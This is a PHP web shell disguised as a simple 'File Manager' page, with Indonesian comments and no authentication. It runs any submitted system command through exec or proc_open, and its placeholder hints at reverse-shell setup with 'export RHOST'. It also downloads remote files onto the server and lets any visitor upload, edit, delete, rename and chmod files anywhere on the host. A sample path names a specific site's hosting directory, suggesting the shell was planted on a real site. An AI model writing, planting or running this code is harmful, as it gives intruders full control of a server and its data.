<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Direktori dasar untuk tombol "Home"
$baseDir = __DIR__;

// Direktori saat ini dari parameter ?dir=
$currentDir = isset($_GET['dir']) ? realpath($_GET['dir']) : $baseDir;
if ($currentDir === false || !is_dir($currentDir)) {
    $currentDir = $baseDir; // Kembali ke baseDir jika path tidak valid
}

// Proses pencarian direktori
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['search_dir']) && !empty($_POST['dir_path'])) {
    $searchPath = realpath($_POST['dir_path']);
    if ($searchPath !== false && is_dir($searchPath)) {
        header('Location: ?dir=' . urlencode($searchPath));
        exit;
    } else {
        $msg = 'Error: Invalid directory path';
    }
}

// Fungsi untuk menjalankan perintah menggunakan proc_open melalui shell
function runTask($task, $dir) {
    if (function_exists('proc_open')) {
        $shell = '/bin/sh'; // Ganti dengan '/bin/bash' jika tersedia dan diinginkan
        $descriptors = [
            0 => ["pipe", "r"], // stdin
            1 => ["pipe", "w"], // stdout
            2 => ["pipe", "w"]  // stderr
        ];
        $process = proc_open($shell, $descriptors, $pipes, $dir);
        if (is_resource($process)) {
            // Tulis perintah ke stdin
            fwrite($pipes[0], $task . " 2>&1\n");
            fclose($pipes[0]);
            // Ambil output dari stdout
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            // Ambil error dari stderr
            $error = stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
            // Gabungkan output dan error
            return "<pre>" . htmlspecialchars($output . $error) . "</pre>";
        }
    }
    return "<font color='red'>Task execution failed or disabled!</font>";
}

// Fungsi untuk mendapatkan daftar file
function getFiles($dir) {
    $files = array_diff(scandir($dir), ['.', '..']);
    $result = [];
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        $result[] = [
            'name' => $file,
            'type' => is_dir($path) ? 'dir' : 'file',
            'size' => is_file($path) ? filesize($path) : 0,
            'perm' => substr(sprintf('%o', fileperms($path)), -4)
        ];
    }
    return $result;
}

// Fungsi untuk membuat breadcrumb
function getBreadcrumb($baseDir, $currentDir) {
    $parts = array_filter(explode('/', $currentDir));
    $path = '';
    $crumb = ['<a href="?dir=' . urlencode($baseDir) . '">Home</a>'];
    foreach ($parts as $part) {
        $path .= '/' . $part;
        $crumb[] = '<a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a>';
    }
    return implode(' / ', $crumb);
}

// Proses aksi
$msg = '';
$cmdOutput = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['search_dir'])) {
    try {
        if (isset($_POST['upload']) && isset($_FILES['file'])) {
            $file = $_FILES['file'];
            $target = $currentDir . '/' . basename($file['name']);
            if (move_uploaded_file($file['tmp_name'], $target)) {
                $msg = 'File uploaded successfully';
            } else {
                $msg = 'Failed to upload file';
            }
        } elseif (isset($_POST['url_upload']) && !empty($_POST['url']) && !empty($_POST['method'])) {
            $url = filter_var($_POST['url'], FILTER_SANITIZE_URL);
            $fileName = basename($url);
            $target = $currentDir . '/' . $fileName;
            if ($_POST['method'] === 'curl' && function_exists('curl_init')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                $data = curl_exec($ch);
                curl_close($ch);
                if (file_put_contents($target, $data)) {
                    $msg = 'File downloaded successfully via cURL';
                } else {
                    $msg = 'Failed to download file via cURL';
                }
            } elseif ($_POST['method'] === 'wget') {
                // Gunakan file_get_contents sebagai alternatif karena exec dinonaktifkan
                $data = @file_get_contents($url);
                if ($data !== false && file_put_contents($target, $data)) {
                    $msg = 'File downloaded successfully via wget (using file_get_contents)';
                } else {
                    $msg = 'Failed to download file via wget: file_get_contents not supported or invalid URL';
                }
            } else {
                $msg = 'Selected method not available';
            }
        } elseif (isset($_POST['rename']) && !empty($_POST['old_name']) && !empty($_POST['new_name'])) {
            $old = $currentDir . '/' . $_POST['old_name'];
            $new = $currentDir . '/' . $_POST['new_name'];
            if (rename($old, $new)) {
                $msg = 'Renamed successfully';
            } else {
                $msg = 'Failed to rename';
            }
        } elseif (isset($_POST['edit']) && !empty($_POST['file']) && isset($_POST['content'])) {
            $file = $currentDir . '/' . $_POST['file'];
            if (is_file($file) && file_put_contents($file, $_POST['content'])) {
                $msg = 'File edited successfully';
            } else {
                $msg = 'Failed to edit file';
            }
            // Redirect kembali ke direktori saat ini setelah edit
            header('Location: ?dir=' . urlencode($currentDir));
            exit;
        } elseif (isset($_POST['chmod']) && !empty($_POST['file']) && !empty($_POST['perm'])) {
            $file = $currentDir . '/' . $_POST['file'];
            $perm = octdec($_POST['perm']);
            if (chmod($file, $perm)) {
                $msg = 'Permissions changed successfully';
            } else {
                $msg = 'Failed to change permissions';
            }
        } elseif (isset($_POST['delete']) && !empty($_POST['file'])) {
            $file = $currentDir . '/' . $_POST['file'];
            if (is_file($file) && unlink($file)) {
                $msg = 'File deleted successfully';
            } elseif (is_dir($file) && rmdir($file)) {
                $msg = 'Folder deleted successfully';
            } else {
                $msg = 'Failed to delete';
            }
        } elseif (isset($_POST['command']) && !empty($_POST['command']) && !empty($_POST['cmd_method'])) {
            $command = trim($_POST['command']);
            // Tidak ada validasi karakter
            if ($_POST['cmd_method'] === 'exec' && function_exists('exec')) {
                $output = [];
                $return_var = 0;
                exec($command . ' 2>&1', $output, $return_var);
                $cmdOutput = "<pre>" . htmlspecialchars(implode("\n", $output)) . "</pre>";
            } elseif ($_POST['cmd_method'] === 'base64') {
                $encodedCommand = base64_encode($command);
                $decodedCommand = base64_decode($encodedCommand); // Untuk validasi
                if ($decodedCommand === $command) {
                    $cmdOutput = runTask($command, $currentDir);
                } else {
                    $cmdOutput = "<font color='red'>Base64 encoding/decoding error!</font>";
                }
            } else {
                $cmdOutput = "<font color='red'>Selected command method is disabled on this server!</font>";
            }
        }
    } catch (Exception $e) {
        $msg = 'Error: ' . $e->getMessage();
    }
}

// Mode edit: hanya tampilkan form edit jika parameter get_content ada
if (isset($_GET['get_content']) && is_file($currentDir . '/' . $_GET['get_content'])) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>Edit File - File Manager</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            textarea { width: 100%; height: 400px; }
            .error { color: red; }
            .success { color: green; }
        </style>
    </head>
    <body>
        <h2>Edit File: <?php echo htmlspecialchars($_GET['get_content']); ?></h2>
        <?php if ($msg): ?>
            <p class="<?php echo strpos($msg, 'success') !== false ? 'success' : 'error'; ?>">
                <?php echo htmlspecialchars($msg); ?>
            </p>
        <?php endif; ?>
        <form action="" method="post">
            <input type="hidden" name="file" value="<?php echo htmlspecialchars($_GET['get_content']); ?>">
            <textarea name="content"><?php echo htmlspecialchars(file_get_contents($currentDir . '/' . $_GET['get_content'])); ?></textarea>
            <input type="submit" name="edit" value="Save">
        </form>
        <a href="?dir=<?php echo urlencode($currentDir); ?>">Back to File Manager</a>
    </body>
    </html>
    <?php
    exit;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .error { color: red; }
        .success { color: green; }
        .breadcrumb { margin-bottom: 10px; }
        textarea { width: 100%; height: 200px; }
        .action-form { display: inline-block; margin-right: 5px; }
        input[type="text"] { width: 100px; }
    </style>
</head>
<body>
    <h2>File Manager</h2>
    <div class="breadcrumb"><?php echo getBreadcrumb($baseDir, $currentDir); ?></div>
    <?php if ($msg): ?>
        <p class="<?php echo strpos($msg, 'success') !== false ? 'success' : 'error'; ?>">
            <?php echo htmlspecialchars($msg); ?>
        </p>
    <?php endif; ?>

    <!-- Form Pencarian Direktori -->
    <h3>Search Directory</h3>
    <form action="" method="post">
        <input type="text" name="dir_path" placeholder="Enter directory path (e.g., /home/u131317956/domains/unzah.com/public_html)" style="width: 300px;">
        <input type="submit" name="search_dir" value="Search">
    </form>

    <!-- Form Upload -->
    <h3>Upload File</h3>
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" name="upload" value="Upload">
    </form>
    <form action="" method="post">
        <input type="url" name="url" placeholder="Enter URL" style="width: 300px;">
        <select name="method">
            <option value="curl">cURL</option>
            <option value="wget">wget (file_get_contents)</option>
        </select>
        <input type="submit" name="url_upload" value="Download">
    </form>

    <!-- Command System -->
    <h3>System Command</h3>
    <form action="" method="post">
        <input type="text" name="command" style="width: 300px;" placeholder="Enter command (e.g., ls -la, export RHOST=...)">
        <select name="cmd_method">
            <option value="exec">exec</option>
            <option value="base64">base64 (proc_open)</option>
        </select>
        <input type="submit" value="Execute">
    </form>
    <?php if ($cmdOutput): ?>
        <?php echo $cmdOutput; ?>
    <?php endif; ?>

    <!-- Jarak antara System Command dan List Dir -->
    <div style="margin-bottom: 20px;"></div>

    <!-- Daftar File -->
    <table>
        <tr><th>Name</th><th>Type</th><th>Size</th><th>Permissions</th><th>Actions</th></tr>
        <?php foreach (getFiles($currentDir) as $item): ?>
            <tr>
                <td>
                    <?php if ($item['type'] === 'dir'): ?>
                        <a href="?dir=<?php echo urlencode($currentDir . '/' . $item['name']); ?>">
                            <?php echo htmlspecialchars($item['name']); ?>
                        </a>
                    <?php else: ?>
                        <?php echo htmlspecialchars($item['name']); ?>
                    <?php endif; ?>
                </td>
                <td><?php echo $item['type']; ?></td>
                <td><?php echo $item['size'] ? number_format($item['size']) . ' bytes' : '-'; ?></td>
                <td><?php echo $item['perm']; ?></td>
                <td>
                    <!-- Form Delete -->
                    <form action="" method="post" class="action-form">
                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($item['name']); ?>">
                        <input type="submit" name="delete" value="Delete">
                    </form>
                    <!-- Form Rename -->
                    <form action="" method="post" class="action-form">
                        <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($item['name']); ?>">
                        <input type="text" name="new_name" value="<?php echo htmlspecialchars($item['name']); ?>" style="width: 80px;">
                        <input type="submit" name="rename" value="Rename">
                    </form>
                    <!-- Form Chmod -->
                    <form action="" method="post" class="action-form">
                        <input type="hidden" name="file" value="<?php echo htmlspecialchars($item['name']); ?>">
                        <input type="text" name="perm" value="<?php echo $item['perm']; ?>" style="width: 50px;" placeholder="0755">
                        <input type="submit" name="chmod" value="Chmod">
                    </form>
                    <?php if ($item['type'] === 'file'): ?>
                        <!-- Tombol Edit -->
                        <a href="?get_content=<?php echo urlencode($item['name']); ?>&dir=<?php echo urlencode($currentDir); ?>">
                            <button>Edit</button>
                        </a>
                    <?php endif; ?>
                </td>
            </tr>
        <?php endforeach; ?>
    </table>
</body>
</html>